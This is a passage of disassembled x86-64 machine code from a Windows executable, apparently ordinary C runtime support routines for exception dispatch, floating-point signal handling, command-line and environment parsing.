   1400026c1:	e8 32 1c 00 00       	call   0x1400042f8
   1400026c6:	e9 a5 00 00 00       	jmp    0x140002770
   1400026cb:	45 33 c9             	xor    %r9d,%r9d
   1400026ce:	45 33 c0             	xor    %r8d,%r8d
   1400026d1:	33 d2                	xor    %edx,%edx
   1400026d3:	33 c9                	xor    %ecx,%ecx
   1400026d5:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   1400026da:	e8 a5 12 00 00       	call   0x140003984
   1400026df:	cc                   	int3
   1400026e0:	45 33 c9             	xor    %r9d,%r9d
   1400026e3:	45 33 c0             	xor    %r8d,%r8d
   1400026e6:	33 d2                	xor    %edx,%edx
   1400026e8:	33 c9                	xor    %ecx,%ecx
   1400026ea:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   1400026ef:	e8 90 12 00 00       	call   0x140003984
   1400026f4:	cc                   	int3
   1400026f5:	45 33 c9             	xor    %r9d,%r9d
   1400026f8:	45 33 c0             	xor    %r8d,%r8d
   1400026fb:	33 d2                	xor    %edx,%edx
   1400026fd:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140002702:	e8 7d 12 00 00       	call   0x140003984
   140002707:	cc                   	int3
   140002708:	b9 f4 ff ff ff       	mov    $0xfffffff4,%ecx
   14000270d:	ff 15 65 5a 00 00    	call   *0x5a65(%rip)        # 0x140008178
   140002713:	48 8b f8             	mov    %rax,%rdi
   140002716:	48 85 c0             	test   %rax,%rax
   140002719:	74 55                	je     0x140002770
   14000271b:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000271f:	74 4f                	je     0x140002770
   140002721:	8b d6                	mov    %esi,%edx
   140002723:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   140002728:	8a 0b                	mov    (%rbx),%cl
   14000272a:	41 88 08             	mov    %cl,(%r8)
   14000272d:	66 39 33             	cmp    %si,(%rbx)
   140002730:	74 11                	je     0x140002743
   140002732:	ff c2                	inc    %edx
   140002734:	49 ff c0             	inc    %r8
   140002737:	48 83 c3 02          	add    $0x2,%rbx
   14000273b:	81 fa f4 01 00 00    	cmp    $0x1f4,%edx
   140002741:	72 e5                	jb     0x140002728
   140002743:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140002748:	40 88 b4 24 33 02 00 	mov    %sil,0x233(%rsp)
   14000274f:	00 
   140002750:	e8 fb 1a 00 00       	call   0x140004250
   140002755:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   14000275a:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   14000275f:	48 8b cf             	mov    %rdi,%rcx
   140002762:	4c 8b c0             	mov    %rax,%r8
   140002765:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   14000276a:	ff 15 00 5a 00 00    	call   *0x5a00(%rip)        # 0x140008170
   140002770:	48 8b 8c 24 40 02 00 	mov    0x240(%rsp),%rcx
   140002777:	00 
   140002778:	48 33 cc             	xor    %rsp,%rcx
   14000277b:	e8 b0 1f 00 00       	call   0x140004730
   140002780:	4c 8d 9c 24 50 02 00 	lea    0x250(%rsp),%r11
   140002787:	00 
   140002788:	49 8b 5b 28          	mov    0x28(%r11),%rbx
   14000278c:	49 8b 6b 30          	mov    0x30(%r11),%rbp
   140002790:	49 8b 73 38          	mov    0x38(%r11),%rsi
   140002794:	49 8b e3             	mov    %r11,%rsp
   140002797:	41 5d                	pop    %r13
   140002799:	41 5c                	pop    %r12
   14000279b:	5f                   	pop    %rdi
   14000279c:	c3                   	ret
   14000279d:	cc                   	int3
   14000279e:	cc                   	int3
   14000279f:	cc                   	int3
   1400027a0:	48 83 ec 28          	sub    $0x28,%rsp
   1400027a4:	b9 03 00 00 00       	mov    $0x3,%ecx
   1400027a9:	e8 32 1f 00 00       	call   0x1400046e0
   1400027ae:	83 f8 01             	cmp    $0x1,%eax
   1400027b1:	74 17                	je     0x1400027ca
   1400027b3:	b9 03 00 00 00       	mov    $0x3,%ecx
   1400027b8:	e8 23 1f 00 00       	call   0x1400046e0
   1400027bd:	85 c0                	test   %eax,%eax
   1400027bf:	75 1d                	jne    0x1400027de
   1400027c1:	83 3d 38 88 00 00 01 	cmpl   $0x1,0x8838(%rip)        # 0x14000b000
   1400027c8:	75 14                	jne    0x1400027de
   1400027ca:	b9 fc 00 00 00       	mov    $0xfc,%ecx
   1400027cf:	e8 6c fd ff ff       	call   0x140002540
   1400027d4:	b9 ff 00 00 00       	mov    $0xff,%ecx
   1400027d9:	e8 62 fd ff ff       	call   0x140002540
   1400027de:	48 83 c4 28          	add    $0x28,%rsp
   1400027e2:	c3                   	ret
   1400027e3:	cc                   	int3
   1400027e4:	48 89 0d 0d 9f 00 00 	mov    %rcx,0x9f0d(%rip)        # 0x14000c6f8
   1400027eb:	c3                   	ret
   1400027ec:	40 53                	rex push %rbx
   1400027ee:	48 83 ec 20          	sub    $0x20,%rsp
   1400027f2:	48 8b d9             	mov    %rcx,%rbx
   1400027f5:	48 8b 0d fc 9e 00 00 	mov    0x9efc(%rip),%rcx        # 0x14000c6f8
   1400027fc:	ff 15 66 59 00 00    	call   *0x5966(%rip)        # 0x140008168
   140002802:	48 85 c0             	test   %rax,%rax
   140002805:	74 10                	je     0x140002817
   140002807:	48 8b cb             	mov    %rbx,%rcx
   14000280a:	ff d0                	call   *%rax
   14000280c:	85 c0                	test   %eax,%eax
   14000280e:	74 07                	je     0x140002817
   140002810:	b8 01 00 00 00       	mov    $0x1,%eax
   140002815:	eb 02                	jmp    0x140002819
   140002817:	33 c0                	xor    %eax,%eax
   140002819:	48 83 c4 20          	add    $0x20,%rsp
   14000281d:	5b                   	pop    %rbx
   14000281e:	c3                   	ret
   14000281f:	cc                   	int3
   140002820:	48 83 ec 28          	sub    $0x28,%rsp
   140002824:	48 8b 01             	mov    (%rcx),%rax
   140002827:	81 38 63 73 6d e0    	cmpl   $0xe06d7363,(%rax)
   14000282d:	75 2b                	jne    0x14000285a
   14000282f:	83 78 18 04          	cmpl   $0x4,0x18(%rax)
   140002833:	75 25                	jne    0x14000285a
   140002835:	8b 40 20             	mov    0x20(%rax),%eax
   140002838:	3d 20 05 93 19       	cmp    $0x19930520,%eax
   14000283d:	74 15                	je     0x140002854
   14000283f:	3d 21 05 93 19       	cmp    $0x19930521,%eax
   140002844:	74 0e                	je     0x140002854
   140002846:	3d 22 05 93 19       	cmp    $0x19930522,%eax
   14000284b:	74 07                	je     0x140002854
   14000284d:	3d 00 40 99 01       	cmp    $0x1994000,%eax
   140002852:	75 06                	jne    0x14000285a
   140002854:	e8 3f 14 00 00       	call   0x140003c98
   140002859:	cc                   	int3
   14000285a:	33 c0                	xor    %eax,%eax
   14000285c:	48 83 c4 28          	add    $0x28,%rsp
   140002860:	c3                   	ret
   140002861:	cc                   	int3
   140002862:	cc                   	int3
   140002863:	cc                   	int3
   140002864:	48 83 ec 28          	sub    $0x28,%rsp
   140002868:	48 8d 0d b1 ff ff ff 	lea    -0x4f(%rip),%rcx        # 0x140002820
   14000286f:	ff 15 13 59 00 00    	call   *0x5913(%rip)        # 0x140008188
   140002875:	33 c0                	xor    %eax,%eax
   140002877:	48 83 c4 28          	add    $0x28,%rsp
   14000287b:	c3                   	ret
   14000287c:	4c 8b dc             	mov    %rsp,%r11
   14000287f:	49 89 5b 08          	mov    %rbx,0x8(%r11)
   140002883:	49 89 6b 18          	mov    %rbp,0x18(%r11)
   140002887:	49 89 73 20          	mov    %rsi,0x20(%r11)
   14000288b:	49 89 53 10          	mov    %rdx,0x10(%r11)
   14000288f:	57                   	push   %rdi
   140002890:	41 54                	push   %r12
   140002892:	41 55                	push   %r13
   140002894:	41 56                	push   %r14
   140002896:	41 57                	push   %r15
   140002898:	48 83 ec 40          	sub    $0x40,%rsp
   14000289c:	4d 8b 79 08          	mov    0x8(%r9),%r15
   1400028a0:	4d 8b 31             	mov    (%r9),%r14
   1400028a3:	8b 41 04             	mov    0x4(%rcx),%eax
   1400028a6:	49 8b 79 38          	mov    0x38(%r9),%rdi
   1400028aa:	4d 2b f7             	sub    %r15,%r14
   1400028ad:	4d 8b e1             	mov    %r9,%r12
   1400028b0:	4c 8b ea             	mov    %rdx,%r13
   1400028b3:	48 8b e9             	mov    %rcx,%rbp
   1400028b6:	a8 66                	test   $0x66,%al
   1400028b8:	0f 85 ed 00 00 00    	jne    0x1400029ab
   1400028be:	49 63 71 48          	movslq 0x48(%r9),%rsi
   1400028c2:	49 89 4b c8          	mov    %rcx,-0x38(%r11)
   1400028c6:	4d 89 43 d0          	mov    %r8,-0x30(%r11)
   1400028ca:	48 8b c6             	mov    %rsi,%rax
   1400028cd:	3b 37                	cmp    (%rdi),%esi
   1400028cf:	0f 83 81 01 00 00    	jae    0x140002a56
   1400028d5:	48 03 c0             	add    %rax,%rax
   1400028d8:	48 8d 5c c7 0c       	lea    0xc(%rdi,%rax,8),%rbx
   1400028dd:	8b 43 f8             	mov    -0x8(%rbx),%eax
   1400028e0:	4c 3b f0             	cmp    %rax,%r14
   1400028e3:	0f 82 a8 00 00 00    	jb     0x140002991
   1400028e9:	8b 43 fc             	mov    -0x4(%rbx),%eax
   1400028ec:	4c 3b f0             	cmp    %rax,%r14
   1400028ef:	0f 83 9c 00 00 00    	jae    0x140002991
   1400028f5:	83 7b 04 00          	cmpl   $0x0,0x4(%rbx)
   1400028f9:	0f 84 92 00 00 00    	je     0x140002991
   1400028ff:	83 3b 01             	cmpl   $0x1,(%rbx)
   140002902:	74 19                	je     0x14000291d
   140002904:	8b 03                	mov    (%rbx),%eax
   140002906:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   14000290b:	49 8b d5             	mov    %r13,%rdx
   14000290e:	49 03 c7             	add    %r15,%rax
   140002911:	ff d0                	call   *%rax
   140002913:	85 c0                	test   %eax,%eax
   140002915:	0f 88 89 00 00 00    	js     0x1400029a4
   14000291b:	7e 74                	jle    0x140002991
   14000291d:	81 7d 00 63 73 6d e0 	cmpl   $0xe06d7363,0x0(%rbp)
   140002924:	75 28                	jne    0x14000294e
   140002926:	48 83 3d 72 aa 00 00 	cmpq   $0x0,0xaa72(%rip)        # 0x14000d3a0
   14000292d:	00 
   14000292e:	74 1e                	je     0x14000294e
   140002930:	48 8d 0d 69 aa 00 00 	lea    0xaa69(%rip),%rcx        # 0x14000d3a0
   140002937:	e8 34 18 00 00       	call   0x140004170
   14000293c:	85 c0                	test   %eax,%eax
   14000293e:	74 0e                	je     0x14000294e
   140002940:	ba 01 00 00 00       	mov    $0x1,%edx
   140002945:	48 8b cd             	mov    %rbp,%rcx
   140002948:	ff 15 52 aa 00 00    	call   *0xaa52(%rip)        # 0x14000d3a0
   14000294e:	8b 4b 04             	mov    0x4(%rbx),%ecx
   140002951:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140002957:	49 8b d5             	mov    %r13,%rdx
   14000295a:	49 03 cf             	add    %r15,%rcx
   14000295d:	e8 2e 1e 00 00       	call   0x140004790
   140002962:	49 8b 44 24 40       	mov    0x40(%r12),%rax
   140002967:	8b 53 04             	mov    0x4(%rbx),%edx
   14000296a:	4c 63 4d 00          	movslq 0x0(%rbp),%r9
   14000296e:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140002973:	49 8b 44 24 28       	mov    0x28(%r12),%rax
   140002978:	49 03 d7             	add    %r15,%rdx
   14000297b:	4c 8b c5             	mov    %rbp,%r8
   14000297e:	49 8b cd             	mov    %r13,%rcx
   140002981:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140002986:	ff 15 74 59 00 00    	call   *0x5974(%rip)        # 0x140008300
   14000298c:	e8 2f 1e 00 00       	call   0x1400047c0
   140002991:	ff c6                	inc    %esi
   140002993:	48 83 c3 10          	add    $0x10,%rbx
   140002997:	3b 37                	cmp    (%rdi),%esi
   140002999:	0f 83 b7 00 00 00    	jae    0x140002a56
   14000299f:	e9 39 ff ff ff       	jmp    0x1400028dd
   1400029a4:	33 c0                	xor    %eax,%eax
   1400029a6:	e9 b0 00 00 00       	jmp    0x140002a5b
   1400029ab:	4d 8b 41 20          	mov    0x20(%r9),%r8
   1400029af:	33 ed                	xor    %ebp,%ebp
   1400029b1:	45 33 ed             	xor    %r13d,%r13d
   1400029b4:	4d 2b c7             	sub    %r15,%r8
   1400029b7:	a8 20                	test   $0x20,%al
   1400029b9:	74 3b                	je     0x1400029f6
   1400029bb:	33 d2                	xor    %edx,%edx
   1400029bd:	39 17                	cmp    %edx,(%rdi)
   1400029bf:	76 35                	jbe    0x1400029f6
   1400029c1:	48 8d 4f 08          	lea    0x8(%rdi),%rcx
   1400029c5:	8b 41 fc             	mov    -0x4(%rcx),%eax
   1400029c8:	4c 3b c0             	cmp    %rax,%r8
   1400029cb:	72 07                	jb     0x1400029d4
   1400029cd:	8b 01                	mov    (%rcx),%eax
   1400029cf:	4c 3b c0             	cmp    %rax,%r8
   1400029d2:	76 0c                	jbe    0x1400029e0
   1400029d4:	ff c2                	inc    %edx
   1400029d6:	48 83 c1 10          	add    $0x10,%rcx
   1400029da:	3b 17                	cmp    (%rdi),%edx
   1400029dc:	73 18                	jae    0x1400029f6
   1400029de:	eb e5                	jmp    0x1400029c5
   1400029e0:	8b c2                	mov    %edx,%eax
   1400029e2:	48 03 c0             	add    %rax,%rax
   1400029e5:	8b 4c c7 10          	mov    0x10(%rdi,%rax,8),%ecx
   1400029e9:	85 c9                	test   %ecx,%ecx
   1400029eb:	75 06                	jne    0x1400029f3
   1400029ed:	8b 6c c7 0c          	mov    0xc(%rdi,%rax,8),%ebp
   1400029f1:	eb 03                	jmp    0x1400029f6
   1400029f3:	44 8b e9             	mov    %ecx,%r13d
   1400029f6:	49 63 71 48          	movslq 0x48(%r9),%rsi
   1400029fa:	48 8b de             	mov    %rsi,%rbx
   1400029fd:	3b 37                	cmp    (%rdi),%esi
   1400029ff:	73 55                	jae    0x140002a56
   140002a01:	48 ff c3             	inc    %rbx
   140002a04:	48 c1 e3 04          	shl    $0x4,%rbx
   140002a08:	48 03 df             	add    %rdi,%rbx
   140002a0b:	8b 43 f4             	mov    -0xc(%rbx),%eax
   140002a0e:	4c 3b f0             	cmp    %rax,%r14
   140002a11:	72 39                	jb     0x140002a4c
   140002a13:	8b 43 f8             	mov    -0x8(%rbx),%eax
   140002a16:	4c 3b f0             	cmp    %rax,%r14
   140002a19:	73 31                	jae    0x140002a4c
   140002a1b:	45 85 ed             	test   %r13d,%r13d
   140002a1e:	74 05                	je     0x140002a25
   140002a20:	44 3b 2b             	cmp    (%rbx),%r13d
   140002a23:	74 31                	je     0x140002a56
   140002a25:	85 ed                	test   %ebp,%ebp
   140002a27:	74 05                	je     0x140002a2e
   140002a29:	3b 6b fc             	cmp    -0x4(%rbx),%ebp
   140002a2c:	74 28                	je     0x140002a56
   140002a2e:	83 3b 00             	cmpl   $0x0,(%rbx)
   140002a31:	75 19                	jne    0x140002a4c
   140002a33:	48 8b 54 24 78       	mov    0x78(%rsp),%rdx
   140002a38:	8d 46 01             	lea    0x1(%rsi),%eax
   140002a3b:	b1 01                	mov    $0x1,%cl
   140002a3d:	41 89 44 24 48       	mov    %eax,0x48(%r12)
   140002a42:	44 8b 43 fc          	mov    -0x4(%rbx),%r8d
   140002a46:	4d 03 c7             	add    %r15,%r8
   140002a49:	41 ff d0             	call   *%r8
   140002a4c:	ff c6                	inc    %esi
   140002a4e:	48 83 c3 10          	add    $0x10,%rbx
   140002a52:	3b 37                	cmp    (%rdi),%esi
   140002a54:	72 b5                	jb     0x140002a0b
   140002a56:	b8 01 00 00 00       	mov    $0x1,%eax
   140002a5b:	4c 8d 5c 24 40       	lea    0x40(%rsp),%r11
   140002a60:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   140002a64:	49 8b 6b 40          	mov    0x40(%r11),%rbp
   140002a68:	49 8b 73 48          	mov    0x48(%r11),%rsi
   140002a6c:	49 8b e3             	mov    %r11,%rsp
   140002a6f:	41 5f                	pop    %r15
   140002a71:	41 5e                	pop    %r14
   140002a73:	41 5d                	pop    %r13
   140002a75:	41 5c                	pop    %r12
   140002a77:	5f                   	pop    %rdi
   140002a78:	c3                   	ret
   140002a79:	cc                   	int3
   140002a7a:	cc                   	int3
   140002a7b:	cc                   	int3
   140002a7c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002a81:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140002a86:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140002a8b:	57                   	push   %rdi
   140002a8c:	48 83 ec 20          	sub    $0x20,%rsp
   140002a90:	48 8b f2             	mov    %rdx,%rsi
   140002a93:	8b f9                	mov    %ecx,%edi
   140002a95:	e8 82 0a 00 00       	call   0x14000351c
   140002a9a:	45 33 c9             	xor    %r9d,%r9d
   140002a9d:	48 8b d8             	mov    %rax,%rbx
   140002aa0:	48 85 c0             	test   %rax,%rax
   140002aa3:	0f 84 8c 01 00 00    	je     0x140002c35
   140002aa9:	48 8b 90 a0 00 00 00 	mov    0xa0(%rax),%rdx
   140002ab0:	48 8b ca             	mov    %rdx,%rcx
   140002ab3:	39 39                	cmp    %edi,(%rcx)
   140002ab5:	74 10                	je     0x140002ac7
   140002ab7:	48 8d 82 c0 00 00 00 	lea    0xc0(%rdx),%rax
   140002abe:	48 83 c1 10          	add    $0x10,%rcx
   140002ac2:	48 3b c8             	cmp    %rax,%rcx
   140002ac5:	72 ec                	jb     0x140002ab3
   140002ac7:	48 8d 82 c0 00 00 00 	lea    0xc0(%rdx),%rax
   140002ace:	48 3b c8             	cmp    %rax,%rcx
   140002ad1:	73 04                	jae    0x140002ad7
   140002ad3:	39 39                	cmp    %edi,(%rcx)
   140002ad5:	74 03                	je     0x140002ada
   140002ad7:	49 8b c9             	mov    %r9,%rcx
   140002ada:	48 85 c9             	test   %rcx,%rcx
   140002add:	0f 84 52 01 00 00    	je     0x140002c35
   140002ae3:	4c 8b 41 08          	mov    0x8(%rcx),%r8
   140002ae7:	4d 85 c0             	test   %r8,%r8
   140002aea:	0f 84 45 01 00 00    	je     0x140002c35
   140002af0:	49 83 f8 05          	cmp    $0x5,%r8
   140002af4:	75 0d                	jne    0x140002b03
   140002af6:	4c 89 49 08          	mov    %r9,0x8(%rcx)
   140002afa:	41 8d 40 fc          	lea    -0x4(%r8),%eax
   140002afe:	e9 34 01 00 00       	jmp    0x140002c37
   140002b03:	49 83 f8 01          	cmp    $0x1,%r8
   140002b07:	75 08                	jne    0x140002b11
   140002b09:	83 c8 ff             	or     $0xffffffff,%eax
   140002b0c:	e9 26 01 00 00       	jmp    0x140002c37
   140002b11:	48 8b ab a8 00 00 00 	mov    0xa8(%rbx),%rbp
   140002b18:	48 89 b3 a8 00 00 00 	mov    %rsi,0xa8(%rbx)
   140002b1f:	83 79 04 08          	cmpl   $0x8,0x4(%rcx)
   140002b23:	0f 85 f6 00 00 00    	jne    0x140002c1f
   140002b29:	ba 30 00 00 00       	mov    $0x30,%edx
   140002b2e:	48 8b 83 a0 00 00 00 	mov    0xa0(%rbx),%rax
   140002b35:	48 83 c2 10          	add    $0x10,%rdx
   140002b39:	4c 89 4c 02 f8       	mov    %r9,-0x8(%rdx,%rax,1)
   140002b3e:	48 81 fa c0 00 00 00 	cmp    $0xc0,%rdx
   140002b45:	7c e7                	jl     0x140002b2e
   140002b47:	81 39 8e 00 00 c0    	cmpl   $0xc000008e,(%rcx)
   140002b4d:	8b bb b0 00 00 00    	mov    0xb0(%rbx),%edi
   140002b53:	75 0f                	jne    0x140002b64
   140002b55:	c7 83 b0 00 00 00 83 	movl   $0x83,0xb0(%rbx)
   140002b5c:	00 00 00 
   140002b5f:	e9 a5 00 00 00       	jmp    0x140002c09
   140002b64:	81 39 90 00 00 c0    	cmpl   $0xc0000090,(%rcx)
   140002b6a:	75 0f                	jne    0x140002b7b
   140002b6c:	c7 83 b0 00 00 00 81 	movl   $0x81,0xb0(%rbx)
   140002b73:	00 00 00 
   140002b76:	e9 8e 00 00 00       	jmp    0x140002c09
   140002b7b:	81 39 91 00 00 c0    	cmpl   $0xc0000091,(%rcx)
   140002b81:	75 0c                	jne    0x140002b8f
   140002b83:	c7 83 b0 00 00 00 84 	movl   $0x84,0xb0(%rbx)
   140002b8a:	00 00 00 
   140002b8d:	eb 7a                	jmp    0x140002c09
   140002b8f:	81 39 93 00 00 c0    	cmpl   $0xc0000093,(%rcx)
   140002b95:	75 0c                	jne    0x140002ba3
   140002b97:	c7 83 b0 00 00 00 85 	movl   $0x85,0xb0(%rbx)
   140002b9e:	00 00 00 
   140002ba1:	eb 66                	jmp    0x140002c09
   140002ba3:	81 39 8d 00 00 c0    	cmpl   $0xc000008d,(%rcx)
   140002ba9:	75 0c                	jne    0x140002bb7
   140002bab:	c7 83 b0 00 00 00 82 	movl   $0x82,0xb0(%rbx)
   140002bb2:	00 00 00 
   140002bb5:	eb 52                	jmp    0x140002c09
   140002bb7:	81 39 8f 00 00 c0    	cmpl   $0xc000008f,(%rcx)
   140002bbd:	75 0c                	jne    0x140002bcb
   140002bbf:	c7 83 b0 00 00 00 86 	movl   $0x86,0xb0(%rbx)
   140002bc6:	00 00 00 
   140002bc9:	eb 3e                	jmp    0x140002c09
   140002bcb:	81 39 92 00 00 c0    	cmpl   $0xc0000092,(%rcx)
   140002bd1:	75 0c                	jne    0x140002bdf
   140002bd3:	c7 83 b0 00 00 00 8a 	movl   $0x8a,0xb0(%rbx)
   140002bda:	00 00 00 
   140002bdd:	eb 2a                	jmp    0x140002c09
   140002bdf:	81 39 b5 02 00 c0    	cmpl   $0xc00002b5,(%rcx)
   140002be5:	75 0c                	jne    0x140002bf3
   140002be7:	c7 83 b0 00 00 00 8d 	movl   $0x8d,0xb0(%rbx)
   140002bee:	00 00 00 
   140002bf1:	eb 16                	jmp    0x140002c09
   140002bf3:	81 39 b4 02 00 c0    	cmpl   $0xc00002b4,(%rcx)
   140002bf9:	8b c7                	mov    %edi,%eax
   140002bfb:	ba 8e 00 00 00       	mov    $0x8e,%edx
   140002c00:	0f 44 c2             	cmove  %edx,%eax
   140002c03:	89 83 b0 00 00 00    	mov    %eax,0xb0(%rbx)
   140002c09:	8b 93 b0 00 00 00    	mov    0xb0(%rbx),%edx
   140002c0f:	b9 08 00 00 00       	mov    $0x8,%ecx
   140002c14:	41 ff d0             	call   *%r8
   140002c17:	89 bb b0 00 00 00    	mov    %edi,0xb0(%rbx)
   140002c1d:	eb 0a                	jmp    0x140002c29
   140002c1f:	4c 89 49 08          	mov    %r9,0x8(%rcx)
   140002c23:	8b 49 04             	mov    0x4(%rcx),%ecx
   140002c26:	41 ff d0             	call   *%r8
   140002c29:	48 89 ab a8 00 00 00 	mov    %rbp,0xa8(%rbx)
   140002c30:	e9 d4 fe ff ff       	jmp    0x140002b09
   140002c35:	33 c0                	xor    %eax,%eax
   140002c37:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140002c3c:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140002c41:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140002c46:	48 83 c4 20          	add    $0x20,%rsp
   140002c4a:	5f                   	pop    %rdi
   140002c4b:	c3                   	ret
   140002c4c:	48 8b 0d 85 a7 00 00 	mov    0xa785(%rip),%rcx        # 0x14000d3d8
   140002c53:	45 33 c0             	xor    %r8d,%r8d
   140002c56:	48 8d 05 83 63 00 00 	lea    0x6383(%rip),%rax        # 0x140008fe0
   140002c5d:	48 85 c9             	test   %rcx,%rcx
   140002c60:	41 8b d0             	mov    %r8d,%edx
   140002c63:	48 0f 44 c8          	cmove  %rax,%rcx
   140002c67:	66 83 39 20          	cmpw   $0x20,(%rcx)
   140002c6b:	77 0a                	ja     0x140002c77
   140002c6d:	66 44 39 01          	cmp    %r8w,(%rcx)
   140002c71:	74 2c                	je     0x140002c9f
   140002c73:	85 d2                	test   %edx,%edx
   140002c75:	74 20                	je     0x140002c97
   140002c77:	66 83 39 22          	cmpw   $0x22,(%rcx)
   140002c7b:	75 0a                	jne    0x140002c87
   140002c7d:	85 d2                	test   %edx,%edx
   140002c7f:	41 8b c0             	mov    %r8d,%eax
   140002c82:	0f 94 c0             	sete   %al
   140002c85:	8b d0                	mov    %eax,%edx
   140002c87:	48 83 c1 02          	add    $0x2,%rcx
   140002c8b:	eb da                	jmp    0x140002c67
   140002c8d:	66 83 f8 20          	cmp    $0x20,%ax
   140002c91:	77 0c                	ja     0x140002c9f
   140002c93:	48 83 c1 02          	add    $0x2,%rcx
   140002c97:	0f b7 01             	movzwl (%rcx),%eax
   140002c9a:	66 85 c0             	test   %ax,%ax
   140002c9d:	75 ee                	jne    0x140002c8d
   140002c9f:	48 8b c1             	mov    %rcx,%rax
   140002ca2:	c3                   	ret
   140002ca3:	cc                   	int3
   140002ca4:	48 8b c4             	mov    %rsp,%rax
   140002ca7:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140002cab:	48 89 68 10          	mov    %rbp,0x10(%rax)
   140002caf:	48 89 70 18          	mov    %rsi,0x18(%rax)
   140002cb3:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140002cb7:	41 54                	push   %r12
   140002cb9:	48 83 ec 30          	sub    $0x30,%rsp
   140002cbd:	48 8b 1d 9c 93 00 00 	mov    0x939c(%rip),%rbx        # 0x14000c060
   140002cc4:	45 33 e4             	xor    %r12d,%r12d
   140002cc7:	41 8b fc             	mov    %r12d,%edi
   140002cca:	48 85 db             	test   %rbx,%rbx
   140002ccd:	75 1d                	jne    0x140002cec
   140002ccf:	83 c8 ff             	or     $0xffffffff,%eax
   140002cd2:	e9 ba 00 00 00       	jmp    0x140002d91
   140002cd7:	66 83 f8 3d          	cmp    $0x3d,%ax
   140002cdb:	74 02                	je     0x140002cdf
   140002cdd:	ff c7                	inc    %edi
   140002cdf:	48 8b cb             	mov    %rbx,%rcx
   140002ce2:	e8 71 19 00 00       	call   0x140004658
   140002ce7:	48 8d 5c 43 02       	lea    0x2(%rbx,%rax,2),%rbx
   140002cec:	0f b7 03             	movzwl (%rbx),%eax
   140002cef:	66 85 c0             	test   %ax,%ax
   140002cf2:	75 e3                	jne    0x140002cd7
   140002cf4:	8d 47 01             	lea    0x1(%rdi),%eax
   140002cf7:	ba 08 00 00 00       	mov    $0x8,%edx
   140002cfc:	48 63 c8             	movslq %eax,%rcx
   140002cff:	e8 40 1b 00 00       	call   0x140004844
   140002d04:	48 8b f8             	mov    %rax,%rdi
   140002d07:	48 89 05 92 93 00 00 	mov    %rax,0x9392(%rip)        # 0x14000c0a0
   140002d0e:	48 85 c0             	test   %rax,%rax
   140002d11:	74 bc                	je     0x140002ccf
   140002d13:	48 8b 1d 46 93 00 00 	mov    0x9346(%rip),%rbx        # 0x14000c060
   140002d1a:	66 44 39 23          	cmp    %r12w,(%rbx)
   140002d1e:	74 53                	je     0x140002d73
   140002d20:	48 8b cb             	mov    %rbx,%rcx
   140002d23:	e8 30 19 00 00       	call   0x140004658
   140002d28:	66 83 3b 3d          	cmpw   $0x3d,(%rbx)
   140002d2c:	8d 70 01             	lea    0x1(%rax),%esi
   140002d2f:	74 2e                	je     0x140002d5f
   140002d31:	48 63 ee             	movslq %esi,%rbp
   140002d34:	ba 02 00 00 00       	mov    $0x2,%edx
   140002d39:	48 8b cd             	mov    %rbp,%rcx
   140002d3c:	e8 03 1b 00 00       	call   0x140004844
   140002d41:	48 89 07             	mov    %rax,(%rdi)
   140002d44:	48 85 c0             	test   %rax,%rax
   140002d47:	74 78                	je     0x140002dc1
   140002d49:	4c 8b c3             	mov    %rbx,%r8
   140002d4c:	48 8b d5             	mov    %rbp,%rdx
   140002d4f:	48 8b c8             	mov    %rax,%rcx
   140002d52:	e8 1d 19 00 00       	call   0x140004674
   140002d57:	85 c0                	test   %eax,%eax
   140002d59:	75 51                	jne    0x140002dac
   140002d5b:	48 83 c7 08          	add    $0x8,%rdi
   140002d5f:	48 63 c6             	movslq %esi,%rax
   140002d62:	48 8d 1c 43          	lea    (%rbx,%rax,2),%rbx
   140002d66:	66 44 39 23          	cmp    %r12w,(%rbx)
   140002d6a:	75 b4                	jne    0x140002d20
   140002d6c:	48 8b 1d ed 92 00 00 	mov    0x92ed(%rip),%rbx        # 0x14000c060
   140002d73:	48 8b cb             	mov    %rbx,%rcx
   140002d76:	e8 71 f0 ff ff       	call   0x140001dec
   140002d7b:	4c 89 25 de 92 00 00 	mov    %r12,0x92de(%rip)        # 0x14000c060
   140002d82:	4c 89 27             	mov    %r12,(%rdi)
   140002d85:	c7 05 19 a6 00 00 01 	movl   $0x1,0xa619(%rip)        # 0x14000d3a8
   140002d8c:	00 00 00 
   140002d8f:	33 c0                	xor    %eax,%eax
   140002d91:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140002d96:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   140002d9b:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   140002da0:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   140002da5:	48 83 c4 30          	add    $0x30,%rsp
   140002da9:	41 5c                	pop    %r12
   140002dab:	c3                   	ret
   140002dac:	45 33 c9             	xor    %r9d,%r9d
   140002daf:	45 33 c0             	xor    %r8d,%r8d
   140002db2:	33 d2                	xor    %edx,%edx
   140002db4:	33 c9                	xor    %ecx,%ecx
   140002db6:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   140002dbb:	e8 c4 0b 00 00       	call   0x140003984
   140002dc0:	cc                   	int3
   140002dc1:	48 8b 0d d8 92 00 00 	mov    0x92d8(%rip),%rcx        # 0x14000c0a0
   140002dc8:	e8 1f f0 ff ff       	call   0x140001dec
   140002dcd:	4c 89 25 cc 92 00 00 	mov    %r12,0x92cc(%rip)        # 0x14000c0a0
